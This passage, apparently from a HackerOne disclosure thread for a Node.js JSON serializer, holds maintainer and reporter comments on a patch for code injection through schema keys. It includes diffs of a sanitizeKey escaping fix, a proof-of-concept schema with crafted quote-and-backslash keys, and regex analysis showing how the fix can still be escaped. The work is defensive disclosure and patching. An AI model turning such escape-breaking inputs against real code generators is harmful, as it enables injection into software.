json += '${$asString(key)}:' + t\n+              json += '${asString}:' + t\n               rendered = true\n             }\n         `\n@@ -554,9 +561,9 @@ function buildCode (schema, code, laterCode, name, externalSchema, fullSchema) {\n       `\n     } else {\n       code += `\n-        if (obj['${key}'] !== undefined) {\n+        if (obj['${sanitized}'] !== undefined) {\n           ${addComma}\n-          json += '${$asString(key)}:'\n+          json += '${asString}:'\n         `\n \n       var result = nested(laterCode, name, key, schema.properties[key], externalSchema, fullSchema)\n@@ -569,12 +576,12 @@ function buildCode (schema, code, laterCode, name, externalSchema, fullSchema) {\n       code += `\n       } else {\n         ${addComma}\n-        json += '${$asString(key)}:${JSON.stringify(defaultValue).replace(/'/g, '\\'')}'\n+        json += '${asString}:${sanitizeKey(JSON.stringify(defaultValue).replace(/\\\\/g, '\\\\\\\\'))}'\n       `\n     } else if (schema.required \u0026\u0026 schema.required.indexOf(key) !== -1) {\n       code += `\n       } else {\n-        throw new Error('${key} is required!')\n+        throw new Error('${sanitized} is required!')\n       `\n     }\n \n@@ -637,7 +644,7 @@ function addIfThenElse (schema, name, externalSchema, fullSchema) {\n   var merged = merge(copy, then)\n \n   code += `\n-    valid = ajv.validate(${require('util').inspect(i, { depth: null })}, obj)\n+    valid = ajv.validate(${util.inspect(i, { depth: null })}, obj)\n     if (valid) {\n   `\n   if (merged.if \u0026\u0026 merged.then) {\n@@ -835,6 +842,8 @@ function nested (laterCode, name, key, schema, externalSchema, fullSchema, subKe\n   var code = ''\n   var funcName\n \n+  subKey = subKey || ''\n+\n   if (schema.type === undefined) {\n     var inferedType = inferTypeByKeyword(schema)\n     if (inferedType) {\n@@ -845,7 +854,7 @@ function nested (laterCode, name, key, schema, externalSchema, fullSchema, subKe\n   var type = schema.type\n   var nullable = schema.nullable === true\n \n-  var accessor = key.indexOf('[') === 0 ? key : `['${key}']`\n+  var accessor = key.indexOf('[') === 0 ? sanitizeKey(key) : `['${sanitizeKey(key)}']`\n   switch (type) {\n     case 'null':\n       code += `\n@@ -881,7 +890,7 @@ function nested (laterCode, name, key, schema, externalSchema, fullSchema, subKe\n     case undefined:\n       if ('anyOf' in schema) {\n         schema.anyOf.forEach((s, index) =\u003e {\n-          var nestedResult = nested(laterCode, name, key, s, externalSchema, fullSchema, subKey !== undefined ? subKey : 'i' + index)\n+          var nestedResult = nested(laterCode, name, key, s, externalSchema, fullSchema, subKey !== '' ? subKey : 'i' + index)\n           code += `\n             ${index === 0 ? 'if' : 'else if'}(ajv.validate(${require('util').inspect(s, { depth: null })}, obj${accessor}))\n               ${nestedResult.code}\n```","markdown_message":"\u003cp\u003eHere is another diff:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight diff\"\u003e\u003ccode\u003e\u003cspan class=\"gh\"\u003ediff --git a/index.js b/index.js\nindex b6bbe4f..3f1f15c 100644\n\u003c/span\u003e\u003cspan class=\"gd\"\u003e--- a/index.js\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+++ b/index.js\n\u003c/span\u003e\u003cspan class=\"p\"\u003e@@ -2,6 +2,7 @@\u003c/span\u003e\n\n var Ajv = require(\u0026#39;ajv\u0026#39;)\n var merge = require(\u0026#39;deepmerge\u0026#39;)\n\u003cspan class=\"gi\"\u003e+var util = require(\u0026#39;util\u0026#39;)\n\u003c/span\u003e\n // This Ajv instance is used to validate that the passed schema\n // is valid json schema. We reuse the instance to avoid having to\n\u003cspan class=\"p\"\u003e@@ -301,7 +302,7 @@\u003c/span\u003e function addPatternProperties (schema, externalSchema, fullSchema) {\n     }\n     var type = pp[regex].type\n     code += `\n\u003cspan class=\"gd\"\u003e-        if (/${regex}/.test(keys[i])) {\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+        if (/${regex.replace(/\\\\*\\//g, \u0026#39;\\\\/\u0026#39;)}/.test(keys[i])) {\n\u003c/span\u003e     `\n     if (type === \u0026#39;object\u0026#39;) {\n       code += buildObject(pp[regex], \u0026#39;\u0026#39;, \u0026#39;buildObjectPP\u0026#39; + index, externalSchema, fullSchema)\n\u003cspan class=\"p\"\u003e@@ -484,13 +485,17 @@\u003c/span\u003e function refFinder (ref, schema, externalSchema) {\n       return idFinder(schema, `#${ref[1]}`)\n     } else {\n       for (var i = 1; i \u0026lt; walk.length; i++) {\n\u003cspan class=\"gd\"\u003e-        code += `[\u0026#39;${walk[i]}\u0026#39;]`\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+        code += `[\u0026#39;${sanitizeKey(walk[i])}\u0026#39;]`\n\u003c/span\u003e       }\n     }\n   }\n   return (new Function(\u0026#39;schema\u0026#39;, code))(schema)\n }\n\n+function sanitizeKey (key) {\n\u003cspan class=\"gi\"\u003e+  return key.replace(/\\\\*\\\u0026#39;/g, \u0026#39;\\\\\\\u0026#39;\u0026#39;) // eslint-disable-line\n+}\n+\n\u003c/span\u003e function buildCode (schema, code, laterCode, name, externalSchema, fullSchema) {\n   Object.keys(schema.properties || {}).forEach((key, i, a) =\u0026gt; {\n     if (schema.properties[key][\u0026#39;$ref\u0026#39;]) {\n\u003cspan class=\"p\"\u003e@@ -502,12 +507,14 @@\u003c/span\u003e function buildCode (schema, code, laterCode, name, externalSchema, fullSchema) {\n\n     var type = schema.properties[key].type\n     var nullable = schema.properties[key].nullable\n\u003cspan class=\"gi\"\u003e+    var sanitized = sanitizeKey(key)\n+    var asString = sanitizeKey($asString(key).replace(/\\\\/g, \u0026#39;\\\\\\\\\u0026#39;))\n\u003c/span\u003e\n     if (nullable) {\n       code += `\n\u003cspan class=\"gd\"\u003e-        if (obj[\u0026#39;${key}\u0026#39;] === null) {\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+        if (obj[\u0026#39;${sanitized}\u0026#39;] === null) {\n\u003c/span\u003e           ${addComma}\n\u003cspan class=\"gd\"\u003e-          json += \u0026#39;${$asString(key)}:null\u0026#39;\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+          json += \u0026#39;${asString}:null\u0026#39;\n\u003c/span\u003e           var rendered = true\n         } else {\n       `\n\u003cspan class=\"p\"\u003e@@ -515,10 +522,10 @@\u003c/span\u003e function buildCode (schema, code, laterCode, name, externalSchema, fullSchema) {\n\n     if (type === \u0026#39;number\u0026#39;) {\n       code += `\n\u003cspan class=\"gd\"\u003e-          var t = Number(obj[\u0026#39;${key}\u0026#39;])\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+          var t = Number(obj[\u0026#39;${sanitized}\u0026#39;])\n\u003c/span\u003e           if (!isNaN(t)) {\n             ${addComma}\n\u003cspan class=\"gd\"\u003e-            json += \u0026#39;${$asString(key)}:\u0026#39; + t\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+            json += \u0026#39;${asString}:\u0026#39; + t\n\u003c/span\u003e       `\n     } else if (type === \u0026#39;integer\u0026#39;) {\n       code += `\n\u003cspan class=\"p\"\u003e@@ -526,25 +533,25 @@\u003c/span\u003e function buildCode (schema, code, laterCode, name, externalSchema, fullSchema) {\n       `\n       if (isLong) {\n         code += `\n\u003cspan class=\"gd\"\u003e-            if (isLong(obj[\u0026#39;${key}\u0026#39;])) {\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+            if (isLong(obj[\u0026#39;${sanitized}\u0026#39;])) {\n\u003c/span\u003e               ${addComma}\n\u003cspan class=\"gd\"\u003e-              json += \u0026#39;${$asString(key)}:\u0026#39; + obj[\u0026#39;${key}\u0026#39;].toString()\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+              json += \u0026#39;${asString}:\u0026#39; + obj[\u0026#39;${sanitized}\u0026#39;].toString()\n\u003c/span\u003e               rendered = true\n             } else {\n\u003cspan class=\"gd\"\u003e-              var t = Number(obj[\u0026#39;${key}\u0026#39;])\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+              var t = Number(obj[\u0026#39;${sanitized}\u0026#39;])\n\u003c/span\u003e               if (!isNaN(t)) {\n                 ${addComma}\n\u003cspan class=\"gd\"\u003e-                json += \u0026#39;${$asString(key)}:\u0026#39; + t\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+                json += \u0026#39;${asString}:\u0026#39; + t\n\u003c/span\u003e                 rendered = true\n               }\n             }\n         `\n       } else {\n         code += `\n\u003cspan class=\"gd\"\u003e-            var t = Number(obj[\u0026#39;${key}\u0026#39;])\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+            var t = Number(obj[\u0026#39;${sanitized}\u0026#39;])\n\u003c/span\u003e             if (!isNaN(t)) {\n               ${addComma}\n\u003cspan class=\"gd\"\u003e-              json += \u0026#39;${$asString(key)}:\u0026#39; + t\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+              json += \u0026#39;${asString}:\u0026#39; + t\n\u003c/span\u003e               rendered = true\n             }\n         `\n\u003cspan class=\"p\"\u003e@@ -554,9 +561,9 @@\u003c/span\u003e function buildCode (schema, code, laterCode, name, externalSchema, fullSchema) {\n       `\n     } else {\n       code += `\n\u003cspan class=\"gd\"\u003e-        if (obj[\u0026#39;${key}\u0026#39;] !== undefined) {\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+        if (obj[\u0026#39;${sanitized}\u0026#39;] !== undefined) {\n\u003c/span\u003e           ${addComma}\n\u003cspan class=\"gd\"\u003e-          json += \u0026#39;${$asString(key)}:\u0026#39;\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+          json += \u0026#39;${asString}:\u0026#39;\n\u003c/span\u003e         `\n\n       var result = nested(laterCode, name, key, schema.properties[key], externalSchema, fullSchema)\n\u003cspan class=\"p\"\u003e@@ -569,12 +576,12 @@\u003c/span\u003e function buildCode (schema, code, laterCode, name, externalSchema, fullSchema) {\n       code += `\n       } else {\n         ${addComma}\n\u003cspan class=\"gd\"\u003e-        json += \u0026#39;${$asString(key)}:${JSON.stringify(defaultValue).replace(/\u0026#39;/g, \u0026#39;\\\u0026#39;\u0026#39;)}\u0026#39;\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+        json += \u0026#39;${asString}:${sanitizeKey(JSON.stringify(defaultValue).replace(/\\\\/g, \u0026#39;\\\\\\\\\u0026#39;))}\u0026#39;\n\u003c/span\u003e       `\n     } else if (schema.required \u0026amp;\u0026amp; schema.required.indexOf(key) !== -1) {\n       code += `\n       } else {\n\u003cspan class=\"gd\"\u003e-        throw new Error(\u0026#39;${key} is required!\u0026#39;)\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+        throw new Error(\u0026#39;${sanitized} is required!\u0026#39;)\n\u003c/span\u003e       `\n     }\n\n@@ -637,7 +644,7 @@ function addIfThenElse (schema, name, externalSchema, fullSchema) {\n   var merged = merge(copy, then)\n\n   code += `\n\u003cspan class=\"gd\"\u003e-    valid = ajv.validate(${require(\u0026#39;util\u0026#39;).inspect(i, { depth: null })}, obj)\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+    valid = ajv.validate(${util.inspect(i, { depth: null })}, obj)\n\u003c/span\u003e     if (valid) {\n   `\n   if (merged.if \u0026amp;\u0026amp; merged.then) {\n\u003cspan class=\"p\"\u003e@@ -835,6 +842,8 @@\u003c/span\u003e function nested (laterCode, name, key, schema, externalSchema, fullSchema, subKe\n   var code = \u0026#39;\u0026#39;\n   var funcName\n\n+  subKey = subKey || \u0026#39;\u0026#39;\n\u003cspan class=\"gi\"\u003e+\n\u003c/span\u003e   if (schema.type === undefined) {\n     var inferedType = inferTypeByKeyword(schema)\n     if (inferedType) {\n\u003cspan class=\"p\"\u003e@@ -845,7 +854,7 @@\u003c/span\u003e function nested (laterCode, name, key, schema, externalSchema, fullSchema, subKe\n   var type = schema.type\n   var nullable = schema.nullable === true\n\n-  var accessor = key.indexOf(\u0026#39;[\u0026#39;) === 0 ? key : `[\u0026#39;${key}\u0026#39;]`\n\u003cspan class=\"gi\"\u003e+  var accessor = key.indexOf(\u0026#39;[\u0026#39;) === 0 ? sanitizeKey(key) : `[\u0026#39;${sanitizeKey(key)}\u0026#39;]`\n\u003c/span\u003e   switch (type) {\n     case \u0026#39;null\u0026#39;:\n       code += `\n\u003cspan class=\"p\"\u003e@@ -881,7 +890,7 @@\u003c/span\u003e function nested (laterCode, name, key, schema, externalSchema, fullSchema, subKe\n     case undefined:\n       if (\u0026#39;anyOf\u0026#39; in schema) {\n         schema.anyOf.forEach((s, index) =\u0026gt; {\n\u003cspan class=\"gd\"\u003e-          var nestedResult = nested(laterCode, name, key, s, externalSchema, fullSchema, subKey !== undefined ? subKey : \u0026#39;i\u0026#39; + index)\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+          var nestedResult = nested(laterCode, name, key, s, externalSchema, fullSchema, subKey !== \u0026#39;\u0026#39; ? subKey : \u0026#39;i\u0026#39; + index)\n\u003c/span\u003e           code += `\n             ${index === 0 ? \u0026#39;if\u0026#39; : \u0026#39;else if\u0026#39;}(ajv.validate(${require(\u0026#39;util\u0026#39;).inspect(s, { depth: null })}, obj${accessor}))\n               ${nestedResult.code}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","automated_response":false,"created_at":"2019-04-18T22:00:30.686Z","updated_at":"2019-04-18T22:01:10.110Z","actor":{"username":"mcollina","cleared":false,"url":"/mcollina","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/230/980/61a26e6fa4ec002fca494b3b7b43aa251eef3453_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4595101,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"i think we are very close, i like this patch.\nhowever there is still an edge case to manage:\n\n```javascript\n'use strict'\n\nconst fastJson = require('.')\nconst stringify = fastJson({\n  title: 'Example Schema',\n  type: 'object',\n  properties: {\n    '\"\\\\\\\\\\\\\\\\\\'w00t': {\n      type: 'string',\n      default: '\"\\'w00t'\n    }\n  }\n})\n\nconsole.log(stringify({}))\n```\n\nproduces the following JSON:\n\n`{\"\\\"'w00t\":\"\\\"'w00t\"}`\n\nbasically, all the backslashes are squashed into one.","markdown_message":"\u003cp\u003ei think we are very close, i like this patch.\u003cbr\u003e\nhowever there is still an edge case to manage:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003euse strict\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\n\n\u003cspan class=\"kd\"\u003econst\u003c/span\u003e \u003cspan class=\"nx\"\u003efastJson\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003erequire\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e.\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"kd\"\u003econst\u003c/span\u003e \u003cspan class=\"nx\"\u003estringify\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003efastJson\u003c/span\u003e\u003cspan class=\"p\"\u003e({\u003c/span\u003e\n  \u003cspan class=\"na\"\u003etitle\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eExample Schema\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n  \u003cspan class=\"na\"\u003etype\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eobject\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n  \u003cspan class=\"na\"\u003eproperties\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\\\\\\\\\\\\\\\\\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003ew00t\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n      \u003cspan class=\"na\"\u003etype\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003estring\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n      \u003cspan class=\"na\"\u003edefault\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003ew00t\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n  \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003cspan class=\"p\"\u003e})\u003c/span\u003e\n\n\u003cspan class=\"nx\"\u003econsole\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elog\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003estringify\u003c/span\u003e\u003cspan class=\"p\"\u003e({}))\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eproduces the following JSON:\u003c/p\u003e\n\n\u003cp\u003e\u003ccode\u003e{\u0026quot;\\\u0026quot;\u0026#39;w00t\u0026quot;:\u0026quot;\\\u0026quot;\u0026#39;w00t\u0026quot;}\u003c/code\u003e\u003c/p\u003e\n\n\u003cp\u003ebasically, all the backslashes are squashed into one.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-04-18T22:59:00.348Z","updated_at":"2019-04-18T22:59:00.348Z","actor":{"username":"phra","cleared":false,"url":"/phra","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/201/213/71f68147b3cb0e1d6e7e39953fc2c4822d04d338_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4758566,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Can you recommend a change to the regular expression to address this? I'm low on time, and I would like to get this released asap.","markdown_message":"\u003cp\u003eCan you recommend a change to the regular expression to address this? I\u0026#39;m low on time, and I would like to get this released asap.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-05-06T16:41:14.567Z","updated_at":"2019-05-06T16:41:14.567Z","actor":{"username":"mcollina","cleared":false,"url":"/mcollina","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/230/980/61a26e6fa4ec002fca494b3b7b43aa251eef3453_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4766115,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"```javascript\nfunction sanitizeKey (key) {\n  return key.replace(/\\\\*\\'/g, '\\\\\\'') // eslint-disable-line\n}\n```\n\nthis regex seems the cause of the bug:\n\n```javascript\n\u003e \"\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'asd\".replace(/\\\\*\\'/g, '\\\\\\'') // invalid output\n=\u003e \"\\'asd\"\n\u003e \"\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'asd\".replace(/\\\\\\'/g, '\\\\\\'') // no effects, valid output\n=\u003e \"\\\\\\\\\\\\\\'asd\"\n\u003e \"\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'asd\".replace(/\\\\\\'/g, '\\\\\\'') // no effects, valid output\n=\u003e \"\\\\\\\\\\\\\\\\'asd\"\n\u003e \"\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'asd\".replace(/\\\\\\'/g, '\\\\\\'') // no effects, valid output\n=\u003e \"\\\\\\\\\\\\\\\\'asd\"\n\u003e \"\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'asd\" // no effects, valid output\n=\u003e \"\\\\\\\\\\\\\\\\'asd\"\n```\n\nthe *bugged* version protects against escaping strings delimited by `'` but produces illegal output.\nthe *fixed* version produces valid JSON because it's not changing the input, but can be exploited to escape strings delimited by `'`.\n\ni see two potential solutions:\n\n1. don't escape `'` and build only strings delimited by `\"`.\n2. use a `function` to replace the backslashes to provide a powerful replace, eg:\n\n```javascript\nfunction sanitizeKey (key) {\n  return key.replace(/\\\\*\\'/g, (str) =\u003e void 'HIC SUNT LEONES') // eslint-disable-line\n}\n```\n","markdown_message":"\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"nx\"\u003esanitizeKey\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ekey\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n  \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nx\"\u003ekey\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ereplace\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"sr\"\u003e/\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\\\u003c/span\u003e\u003cspan class=\"sr\"\u003e*\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026#39;\u003c/span\u003e\u003cspan class=\"sr\"\u003e/g\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\\\\\u0026#39;\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"c1\"\u003e// eslint-disable-line\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003ethis regex seems the cause of the bug:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#39;asd\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ereplace\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"sr\"\u003e/\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\\\u003c/span\u003e\u003cspan class=\"sr\"\u003e*\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026#39;\u003c/span\u003e\u003cspan class=\"sr\"\u003e/g\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\\\\\u0026#39;\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"c1\"\u003e// invalid output\u003c/span\u003e\n\u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#39;asd\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\n\u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#39;asd\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ereplace\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"sr\"\u003e/\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\\\\\u0026#39;\u003c/span\u003e\u003cspan class=\"sr\"\u003e/g\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\\\\\u0026#39;\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"c1\"\u003e// no effects, valid output\u003c/span\u003e\n\u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\\\\\\\\\\\\\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#39;asd\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\n\u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#39;asd\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ereplace\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"sr\"\u003e/\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\\\\\u0026#39;\u003c/span\u003e\u003cspan class=\"sr\"\u003e/g\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\\\\\u0026#39;\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"c1\"\u003e// no effects, valid output\u003c/span\u003e\n\u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\\\\\\\\\\\\\\\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#39;asd\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\n\u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#39;asd\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ereplace\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"sr\"\u003e/\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\\\\\u0026#39;\u003c/span\u003e\u003cspan class=\"sr\"\u003e/g\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\\\\\u0026#39;\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"c1\"\u003e// no effects, valid output\u003c/span\u003e\n\u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\\\\\\\\\\\\\\\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#39;asd\u003c/span\u003e\u003cspan 